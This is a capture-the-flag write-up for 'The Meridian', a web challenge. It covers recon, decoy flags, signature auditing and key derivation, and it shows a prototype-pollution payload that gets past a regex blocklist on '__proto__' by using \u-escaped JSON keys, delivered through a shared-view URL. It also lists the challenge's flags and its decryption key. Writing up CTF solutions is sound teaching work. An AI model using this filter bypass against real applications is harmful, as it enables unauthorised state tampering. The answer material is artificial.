# The Meridian

**Event:** CryoVault CTF 2026
**Category:** web
**Flag:** `isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}`

---

A static client-side "museum" app. The vault is a sealed AES-256-GCM blob; the
only way in is a prototype-polluted shared-view link. Two decoy flags line the
way: the legacy console token and a "wrong pepper" self-test string.

## Files
- `solve.py` - offline solve (unmask → registrar audit → key derivation → decrypt)
- `exploit-payload.txt` - the browser payload / URL
- `src/` - mirror of the deployed site (JS + data snapshot)
- `results.txt` - captured solve output

## 1. Recon
`GET https://isfcrpesu-the-meridian.chals.io/` is a hash-router SPA. Scripts:

| file | role |
|---|---|
| `vendor/mcrypto.js` | self-contained SHA-256 + AES-256-GCM |
| `assets/js/core.js` | config engine, provenance check, vault client |
| `data/meridian-data.js` | 14 exhibits, `vault` blob, `legacy` masked lines |
| `assets/js/legacy/provenance-v2.js` | registrar signing helper (decoy pepper) |
| `assets/js/app.js` | router, settings, share-link, `/staff`, `/vault` views |

Two footers links, `#/staff` and `#/vault`, are the targets.

## 2. The two peppers (the first trap)
`core.js` holds `PEPPER = "meridian::provenance::v3::do-not-share"`.
`provenance-v2.js` claims *it* is "the pepper the registrar desk signs with"
and ships a self-test. Running that self-test with its own v2 pepper yields:

```
isfcr{wr0ng_p3pp3r_r1ght_curs3}
```

i.e. v2 is the **wrong** pepper. Unmasking the legacy console lines confirms it:
the v3 pepper decodes cleanly, v2 produces garbage.

## 3. Unmask the legacy console (v3 pepper)
`unmask` is a repeating-key XOR of base64 lines against the pepper. With v3:

```
LEGACY CONSOLE SESSION RESTORED - operator token: isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}
This token opened the old console only. It does NOT open the vault.
--- REG-2291 vault re-key procedure (2021) ---
The vault no longer trusts the console. It reads an operator descriptor from
runtime config: vault = { curators: [...], rounds: N }.
curators: the curator of every piece whose certificate verifies against the
CURRENT registrar pepper, in accession order. The gallery badge is not a
verification.
rounds: 1000 + (sum of the accession years of those same pieces, mod 4096).
Public builds strip any vault descriptor they can see. Staff: use the registrar build.
```

Two decoy flags so far (`wr0ng_p3pp3r`, `l3g4cy_st4ff_c0ns0l3`) - the challenge
title ("one negative the public never sees") points at the real vault.

## 4. Registrar audit → descriptor
`core.js registrarVerify` = `sha256(accession|title|curator|<pepper>)[:12]`.
`hasCertificate` only checks `sig.length === 12`, so the green badge is worthless
exactly as the journal says ("signatures are facts, the badge is not").

Re-signing each exhibit with the **v3** pepper and comparing to its stored `sig`:

| accession | curator | verifies |
|---|---|---|
| MRD-1971-0148 | E. Vantar | ✓ |
| MRD-1984-0912 | R. Oikawa | ✓ |
| MRD-1990-0025 | H. Delacroix | ✓ |
| MRD-2003-0777 | K. Adeyemi | ✓ |
| MRD-2011-0410 | S. Marchetti | ✓ |

(8 exhibits carry a `sig` but fail the audit - stale certificates from the key
rotation described in the journal. MRD-1962-0007 and MRD-2022-0140 have no `sig`.)

```
curators = ["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"]
years    = 1971+1984+1990+2003+2011 = 9959
rounds   = 1000 + (9959 mod 4096) = 2767
```

## 5. Vault key + decrypt
`openVault` derives the key by iterating SHA-256 `rounds` times over
`bsalt + ":" + curators.join("|")`, then AES-256-GCM-decrypts the blob
(aad `meridian-vault`).

```python
h = b"MRD::vault::9f3ac1b7e0:E. Vantar|R. Oikawa|H. Delacroix|K. Adeyemi|S. Marchetti"
for _ in range(2767): h = sha256(h).digest()
AESGCM(h).decrypt(iv, ct+tag, b"meridian-vault")
```

`key = d925209ee493dcb7bc33a1be94307169453ed32ca60ddb6f435ba199a5569d95`

Plaintext: `isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}`

## 6. Getting the descriptor past the app (the real vuln)
`openVault` needs `cfg.vault`, but `sanitizeConfig` **deletes** any *own*
`vault` key and strips non-allowlisted feature flags - so the console
(`features.vault === true`) and a naive descriptor both die. The intended path
is **prototype pollution** through a shared view link, whose only guard is:

```js
var BLOCK = /__proto__|constructor|prototype/i;
function parseStatePayload(text){ if (BLOCK.test(text)) return null; ... }
```

The regex runs on the raw decoded text; `JSON.parse` still expands `\u` escapes
in keys. So:

```json
{"render":{"theme":"cyan"},"\u005f\u005fproto\u005f\u005f":{"vault":{"curators":["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"],"rounds":2767}}}
```

`parseStatePayload` passes (no literal match) → JSON.parse makes an **own**
`__proto__` data property → `deepMerge`'s `target[k] = ...` fires the
`__proto__` setter and writes `vault` onto `Object.prototype` → `sanitizeConfig`
sees it as *inherited* (so does not delete it) → `openVault` reads `cfg.vault`
off the prototype chain and the dial spins open.

URL:
```
https://isfcrpesu-the-meridian.chals.io/#/collection?s=<b64url(JSON above)>
```

`node pptest.js` (in this repo) confirms `cfg.vault` is present and
`hasOwnProperty('vault') === false` - the pollution survives sanitisation.

## 7. Dead ends / decoys
- `isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}` - console token, explicitly not the vault.
- `isfcr{wr0ng_p3pp3r_r1ght_curs3}` - v2 self-test, the wrong pepper.
- Verdigris `provenance` hex → `vfspe{ce0i3a4ap3_cy4dh3_j4f_n_s0et3el}` - a
  scrambled non-flag ("exactly as trustworthy as the certificate beside it").
- `features.vault:true` in a link - stripped by `sanitizeConfig` (not allowlisted).

